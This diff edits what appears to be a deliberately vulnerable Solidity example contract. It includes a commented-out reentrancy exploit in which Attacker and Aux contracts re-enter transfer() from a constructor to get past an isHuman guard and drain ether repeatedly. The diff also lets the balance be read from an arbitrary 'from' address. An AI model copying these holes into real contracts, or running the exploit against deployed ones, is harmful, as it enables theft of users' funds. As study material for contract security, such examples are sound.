@@ -15,7 +15,7 @@ contract C {
     }
 
     function transfer(address from, address to) isHuman() public {
-        uint256 amt = balances[msg.sender];
+        uint256 amt = balances[from];
         require(amt > 0, "Insufficient funds");
         (bool success, ) = to.call{value:amt}("");
         require(success, "Call failed");
@@ -28,22 +28,33 @@ contract C {
 }
 
 // an attacker performs from off-chain:
-// deposit(100)
-// then, transfer(self, attacker, 100) 
+// deposit{value: 100}()
+// then, transfer(self, attacker)
 // where self is the EOA of the attacker
 // and attacker is an instance of the Attacker contract
-// contract Attacker {    
+// contract Attacker {
+
+//     address attacker_eoa;
+//     uint256 public counter = 2;
+
+//     constructor() {
+//         attacker_eoa = msg.sender;
+//     }
+    
 //     receive() payable external {
-//         // now this contract has received 100
+//         // now this contract has received the amount (100)
 //         // and a new contract is instantiated, passing addresses for reentering
-//         Aux att = new Aux(address(this), msg.sender);
+//         if (counter > 0) {
+//             counter--;
+//             new Aux(attacker_eoa, address(this), msg.sender);
+//         }
 //     }
 // }
 
 // contract Aux {
-//     constructor(address attacker, address sender) {
-//         // within this constructor a reentrancy is performed and another 100 are transfered to the Attacker contract
+//     constructor(address attacker_eoa, address attacker, address victim) {
+//         // within this constructor a reentrancy is performed and more ether (100) is transfered to the Attacker contract again
 //         // the isHuman guard succeedes because we are INSIDE a constructor
-//         C(sender).transfer(sender, attacker, 100);
+//         C(victim).transfer(attacker_eoa, attacker);
 //     }
 // }
